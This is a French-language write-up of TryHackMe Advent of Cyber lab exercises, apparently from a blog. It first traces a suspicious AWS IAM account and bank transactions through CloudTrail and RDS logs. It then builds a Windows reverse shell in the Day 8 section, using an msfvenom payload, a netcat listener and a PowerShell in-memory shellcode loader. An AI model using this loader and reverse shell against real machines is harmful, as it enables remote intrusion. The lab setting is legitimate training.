Afin de déterminer le nom de l'utilisateur créé par `mcskidy`, nous utiliserons la commande suivante afin de cibler le service `iam.amazonaws.com` qui sert à la gestion des comptes :

```bash
# Je me suis d'abord aidé de la commande ci-dessous pour savoir quel paramètre afficher
cat cloudtrail_log.json | jq | grep -C5 requestParameters | grep -v null

jq -r '["Event_Time", "Event_type", "Event_Name", "Event_Source", "User_Name", "Source_IP", "Created_username"],(.Records[] | select(.userIdentity.userName == "mcskidy") | select(.eventName == "CreateUser") | [.eventTime, .eventType, .eventName, .eventSource, .userIdentity.userName //"N/A", .sourceIPAddress //"N/A", .requestParameters.userName //"N/A"]) | @tsv' cloudtrail_log.json | column -t -s $'\t'

Event_Time            Event_type  Event_Name  Event_Source       User_Name  Source_IP     Created_username
2024-11-28T15:21:35Z  AwsApiCall  CreateUser  iam.amazonaws.com  mcskidy    53.94.201.69  glitch
```

Le compte `glitch` a été créé par `mcskidy` peut de temps avant les manipulations suspectes.

En analysant ce nouveau compte, nous constatons qu'il dispose de droits élevés sur AWS :

```bash
jq -r '["Event_Time", "Event_type", "Event_Name", "Event_Source", "User_Name", "Source_IP", "Privileges"],(.Records[] | select(.eventSource == "iam.amazonaws.com") | select(.eventName == "AttachUserPolicy") | [.eventTime, .eventType, .eventName, .eventSource, .userIdentity.userName //"N/A", .sourceIPAddress //"N/A", .requestParameters.policyArn //"N/A"]) | @tsv' cloudtrail_log.json | column -t -s $'\t'
Event_Time            Event_type  Event_Name        Event_Source       User_Name  Source_IP     Privileges
2024-11-28T15:21:36Z  AwsApiCall  AttachUserPolicy  iam.amazonaws.com  mcskidy    53.94.201.69  arn:aws:iam::aws:policy/[...expurgé...]
```

Mais il semblerait que quelque chose ne soit pas normal : l'adresse IP utilisé par `mcskidy` en temps normal ne correspond pas à celle utilisée lors de la création de l'utilisateur `glitch`. C'est l'adresse IP de `mayor_malware` !

```bash
jq -r '["Event_Time", "Event_type", "Event_Name", "Event_Source", "User_Name", "Source_IP"],(.Records[] | select(.eventName == "ConsoleLogin") | [.eventTime,.eventType, .eventName, .eventSource, .userIdentity.userName //"N/A", .sourceIPAddress //"N/A"]) | @tsv' cloudtrail_log.json | column -t -s $'\t'

Event_Time            Event_type        Event_Name    Event_Source          User_Name      Source_IP
2024-11-28T15:18:37Z  AwsConsoleSignIn  ConsoleLogin  signin.amazonaws.com  mayor_malware  5[...expurgé...]9
2024-11-28T15:20:54Z  AwsConsoleSignIn  ConsoleLogin  signin.amazonaws.com  mcskidy        5[...expurgé...]9
[...expurgé...]       AwsConsoleSignIn  ConsoleLogin  signin.amazonaws.com  glitch         5[...expurgé...]9
2024-11-22T12:20:54Z  AwsConsoleSignIn  ConsoleLogin  signin.amazonaws.com  mcskidy        3[...expurgé...]9
2024-11-23T07:15:54Z  AwsConsoleSignIn  ConsoleLogin  signin.amazonaws.com  mcskidy        3[...expurgé...]9
2024-11-24T05:19:31Z  AwsConsoleSignIn  ConsoleLogin  signin.amazonaws.com  mcskidy        3[...expurgé...]9
2024-11-25T01:11:32Z  AwsConsoleSignIn  ConsoleLogin  signin.amazonaws.com  mcskidy        3[...expurgé...]9
2024-11-26T19:22:05Z  AwsConsoleSignIn  ConsoleLogin  signin.amazonaws.com  mcskidy        3[...expurgé...]9
2024-11-22T11:08:03Z  AwsConsoleSignIn  ConsoleLogin  signin.amazonaws.com  mayor_malware  5[...expurgé...]9
2024-11-23T07:19:01Z  AwsConsoleSignIn  ConsoleLogin  signin.amazonaws.com  mayor_malware  5[...expurgé...]9
2024-11-24T02:28:17Z  AwsConsoleSignIn  ConsoleLogin  signin.amazonaws.com  mayor_malware  5[...expurgé...]9
2024-11-25T21:48:22Z  AwsConsoleSignIn  ConsoleLogin  signin.amazonaws.com  mayor_malware  5[...expurgé...]9
2024-11-26T22:55:51Z  AwsConsoleSignIn  ConsoleLogin  signin.amazonaws.com  mayor_malware  5[...expurgé...]9
```

Enfin, pour obtenir le numéro de compte de Mayor Malware, nous utilisons une {% include dictionary.html word="regex" %} permettant de trouver les informations au bon format (4 ensembles de 4 chiffres, ensembles séparés par des espaces) :

```bash
grep -E '([0-9]{4}\s){3}[0-9]{4}' rds.log | grep -i 'mayor'
2024-11-28T15:23:02.605Z 2024-11-28T15:23:02.605700Z      263 Query	INSERT INTO wareville_bank_transactions (account_number, account_owner, amount) VALUES ('[...expurgé...]', 'Mayor Malware', 193.45)
2024-11-28T15:23:02.792Z 2024-11-28T15:23:02.792161Z      263 Query	INSERT INTO wareville_bank_transactions (account_number, account_owner, amount) VALUES ('[...expurgé...]', 'Mayor Malware', 998.13)
2024-11-28T15:23:02.976Z 2024-11-28T15:23:02.976943Z      263 Query	INSERT INTO wareville_bank_transactions (account_number, account_owner, amount) VALUES ('[...expurgé...]', 'Mayor Malware', 865.75)
2024-11-28T15:23:03.161Z 2024-11-28T15:23:03.161700Z      263 Query	INSERT INTO wareville_bank_transactions (account_number, account_owner, amount) VALUES ('[...expurgé...]', 'Mayor Malware', 409.54)
[...expurgé pour brièveté...]
```

## Jour 8 : Shellcodes du monde, rassemblement

![Shellcodes](https://img.shields.io/badge/Shellcodes-453368?logo=tryhackme)

![Jour 8](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1730451713924.svg)

Le but de l'exercice est de créer une charge permettant d'obtenir un {% include dictionary.html word="reverse-shell" %} sur une machine Windows.

Nous aurons besoin de créer la charge en elle-même depuis notre machine d'attaque avec la commande :

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.182.77 LPORT=4444 -f powershell
```

Puis nous ouvrons le port 4444 en attente de connexion avec {% include dictionary.html word="Netcat" %} sur la machine d'attaque :

```bash
rlwrap nc -lvnp 4444
```

Ensuite, sur la machine cible, nous lançons un terminal PowerShell et nous commençons par copier le bloc

```powershell
$VrtAlloc = @"
using System;
using System.Runtime.InteropServices;

public class VrtAlloc{
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);  
}
"@

Add-Type $VrtAlloc 

$WaitFor= @"
using System;
using System.Runtime.InteropServices;

public class WaitFor{
 [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);   
}
"@

Add-Type $WaitFor

$CrtThread= @"
using System;
using System.Runtime.InteropServices;

public class CrtThread{
 [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
  
}
"@
Add-Type $CrtThread
```

Après avoir valider ce premier bloc, nous ajoutons le résultat de la commande `msfvenom` réalisée plus tôt.

Ensuite nous devons ajouter les commandes suivantes **ligne par ligne**

```powershell
[IntPtr]$addr = [VrtAlloc]::VirtualAlloc(0, $buf.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $buf.Length)
$thandle = [CrtThread]::CreateThread(0, 0, $addr, 0, 0, 0)
[WaitFor]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
```

Nous avons obtenu notre {% include dictionary.html word="reverse-shell" %}

```bash
rlwrap nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.230.38 49808
Microsoft Windows [Version 10.0.17763.6293]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\glitch>whoami
whoami
aoc\glitch
```

Nous passons le shell de base (`cmd`) en PowerShell, puis nous navigons vers le flag et nous l'ouvrons :

```powershell
PS C:\Users\glitch> Get-ChildItem

    Directory: C:\Users\glitch


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-r---        10/3/2024  10:56 PM                3D Objects                                                            
d-r---        10/3/2024  10:56 PM                Contacts                                                              
d-r---       12/14/2024   8:54 PM                Desktop                                                               
d-r---        10/3/2024  10:56 PM                Documents                                                             
d-r---        10/3/2024  10:56 PM                Downloads                                                             
d-r---        10/3/2024  10:56 PM                Favorites                                                             
d-r---        10/3/2024  10:56 PM                Links                                                                 
d-r---        10/3/2024  10:56 PM                Music                                                                 
d-r---        10/3/2024  10:56 PM                Pictures                                                              
d-r---        10/3/2024  10:56 PM                Saved Games                                                           
d-r---        10/3/2024  10:56 PM                Searches                                                              
d-r---        10/3/2024  10:56 PM                Videos                                                                


PS C:\Users\glitch> Set-Location .\Desktop
PS C:\Users\glitch\Desktop> Get-ChildItem

    Directory: C:\Users\glitch\Desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        6/21/2016   3:36 PM            527 EC2 Feedback.website                                                  
-a----        6/21/2016   3:36 PM            554 EC2 Microsoft Windows Guide.website                                   
-a----        10/3/2024   2:22 PM             26 flag.txt                                                              


PS C:\Users\glitch\Desktop> Get-Content flag.txt
Get-Content flag.txt
AOC{[...expurgé...]}
```
